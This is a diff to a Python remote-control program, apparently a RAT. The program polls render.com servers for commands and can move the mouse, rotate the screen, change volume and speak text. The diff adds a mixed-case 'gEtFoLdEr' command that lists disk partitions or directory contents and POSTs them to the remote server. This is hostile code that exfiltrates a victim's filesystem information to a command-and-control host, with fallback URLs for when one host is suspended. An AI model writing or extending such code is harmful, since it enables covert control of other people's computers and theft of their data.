@@ -1,6 +1,6 @@
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-from os import path, mkdir, startfile, remove, system
+from os import path, mkdir, startfile, remove, system, listdir
 from mouse import move, click, wheel, double_click
 from rotatescreen import get_primary_display
 from PIL.Image import frombytes, Resampling
@@ -18,6 +18,7 @@ import tkinter as tk
 import pyttsx3
 import asyncio
 import aiohttp
+import psutil
 import pygame
 import ctypes
 url = "https://ms32-sha2.onrender.com/" if b"This service has been suspended." not in get("https://ms32-sha2.onrender.com").content else "https://ms32-c67b.onrender.com/"
@@ -589,6 +590,25 @@ def main():
                 txt = cmd.replace("sPeAk","")
                 saying = Thread(target=say,args=(txt,))
                 saying.start()
+            elif "gEtFoLdEr" in  cmd:
+                p = cmd.replace("gEtFoLdEr ","")
+                if p == "/":
+                    folder = {}
+                    partitions = psutil.disk_partitions()
+                    for idx, partition in enumerate(partitions, start=1):
+                        folder[f"folder{idx}"] = partition.device
+                    post(url+"post-folder",json=folder)
+                    print(folder)
+                else:
+                    datas = listdir(p)
+                    folder = {}
+                    for idx, data in enumerate(datas, start=1):
+                        if path.isdir(path.join(p,data)):
+                            folder[f"folder{idx}"] = data
+                        else:
+                            folder[f"file{idx}"] = data
+                    print(folder)
+                    post(url+"post-folder",json=folder)
         except Exception as e:
             log(f"Main thread error occured:\t{e}",state="WARN")
     log("Shutting down",state="OFFLINE")
